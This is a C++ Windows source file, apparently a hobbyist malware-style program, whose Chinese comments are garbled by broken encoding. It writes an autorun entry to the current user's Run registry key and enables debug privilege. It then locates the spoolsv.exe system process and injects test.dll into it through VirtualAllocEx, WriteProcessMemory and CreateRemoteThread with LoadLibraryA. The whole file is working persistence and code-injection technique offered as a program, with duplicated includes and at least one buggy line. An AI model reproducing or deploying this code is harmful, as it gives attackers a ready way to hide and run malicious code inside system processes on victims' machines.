#include <windows.h> 
#include <iostream.h>
#include <tlhelp32.h>
#include <stdio.h>


#include <windows.h> 
#include <iostream.h>
#include <tlhelp32.h>
#include <stdio.h>

int AddRun()
{

	char *szSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char *szModule ="C:\\Documents and Settings\\wenbo\\����\\main\\Debug\\main.exe";
	HKEY hKey;
	
	if(RegOpenKeyEx(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey)== ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "Dll", 0, REG_SZ, (BYTE *)szModule, strlen(szModule));
		RegCloseKey(hKey);
	}
	else
	{
		return -1;
	}
	return 0;
}

int EnableDebugPriv(const char * name) 
{ 
     HANDLE hToken; 
     TOKEN_PRIVILEGES tp; 
     LUID luid; 
      //�򿪽������ƻ� 
       OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, 
         &hToken); 
        //��ý��̱���ΨһID 
        LookupPrivilegeValue(NULL,name,&luid) ;
                          tp.PrivilegeCount = 1; 
                          tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
                          tp.Privileges[0].Luid = luid; 
                          //����Ȩ�� 
                          AdjustTokenPrivileges(hToken,									0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL); 
                          return 0; 
} 

BOOL InjectDll(const char *DllFullPath, const DWORD dwRemoteProcessId) 
{ 
 	HANDLE hRemoteProcess; 
  	EnableDebugPriv(SE_DEBUG_NAME); 
	hRemoteProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId ); 
  	char *pszLibFileRemote; 
	pszLibFileRemote = (char *) VirtualAllocEx( hRemoteProcess, NULL, lstrlen(DllFullPath)+1,MEM_COMMIT, PAGE_READWRITE); 
	WriteProcessMemory(hRemoteProcess,pszLibFileRemote, (void *) DllFullPath, lstrlen(DllFullPath)+1, NULL); 
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA"); 
	HANDLE hRemoteThread; 
	if( (hRemoteThread = CreateRemoteThread( hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL) ) == NULL) 
 	{ 
  		 cout<<"ע���߳�ʧ��!"<<endl; 
   		 return FALSE; 
 	 } 
	CloseHandle(hRemoteProcess);
	CloseHandle(hRemoteThread);
	return TRUE; 
} 

DWORD GetProcessId()//ö�ٽ��̺���
{
	DWORD Pid=-1;
	HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32 lPrs;
	ZeroMemory(&lPrs,sizeof(lPrs));
	lPrs.dwSize=sizeof(lPrs);
	char *targetFile="spoolsv.exe";
	Process32First(hSnap,&lPrs);
	if (strstr(targetFile,lPrs.szExeFile))
	{
		Pid=lPrs.th32ProcessID;
		return Pid;
	}
	while(1)
	{
		ZeroMemory(&lPrs,sizeof(lPrs));
		lPrs.dwSize=(&lPrs,sizeof(lPrs));
		if (!Process32Next(hSnap,&lPrs))//����ö�ٽ�����Ϣ
		{
			Pid=-1;
			break;
		}
		if (strstr(targetFile,lPrs.szExeFile))
		{
			Pid=lPrs.th32ProcessID;
			break;
		}
	}
	return Pid;
}

void main()
{           
          char myFILE[MAX_PATH];
	      GetCurrentDirectory(MAX_PATH,myFILE);  //��ȡ��ǰ���ļ�·��
	      strcat(myFILE,"\\test.dll");
		  cout<<GetProcessId()<<endl;    //��ȡע����̵�id
		  cout<<myFILE<<endl; 
		  AddRun();					    //����������
          InjectDll(myFILE,GetProcessId()) ;   //����dllע��


		 
}
